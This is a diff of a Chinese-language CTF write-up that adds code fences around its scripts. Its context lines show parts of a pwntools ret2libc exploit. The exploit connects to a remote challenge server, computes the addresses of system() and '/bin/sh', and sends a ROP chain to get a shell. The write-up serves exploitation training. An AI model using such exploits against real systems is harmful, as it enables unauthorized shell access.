@@ -129,7 +129,7 @@ author: 0xFA Team
 ```
     #!/usr/bin/env python
     # -*- coding: utf-8 -*-
-                                                                
+  
     cipher = [0x66, 0x64, 0x0C8, 0x68, 0x75, 0x75, 0x14, 0x0B, 0x68, 0x15, 0x68, 0x12]
     data = 'Ea57'
     dic = {}
@@ -347,12 +347,13 @@ author: 0xFA Team
 　　在调试的时候，发现，main的返回地址是`__libc_start_main`里的，意味着，其实程序是ret到libc上的，那拿到这个地址就可以算出`system()`地址，`/bin/sh`地址了。然后找个rop链，让rdi指向`/bin/sh`（tm好久没玩pwn，给记成x86的压栈传参了，然后坑了好久~），就可以getshell了。
 　　exp如下
 
-    #!/usr/bin/env python
+```　　
+　　#!/usr/bin/env python
     # -*- coding: utf-8 -*-
-               
+    
     from pwn import *
     import pwnlib 
-                
+    
     p = remote("120.55.86.95", 22222)
     elf = ELF('./pwn2')
     #libc = ELF("./libc.64.so")
@@ -403,6 +404,7 @@ author: 0xFA Team
                    
     p.send(p64(rop_addr) + p64(system_addr) + p64(bin_addr) + '\x00'*16 + '\n')
     p.interactive()
+```
 
 　　还有个坑就是，你敲得回车键会算一个字符压栈~
 　　![enter image description here](http://purpleroc.com/md/hctf/exp.png)
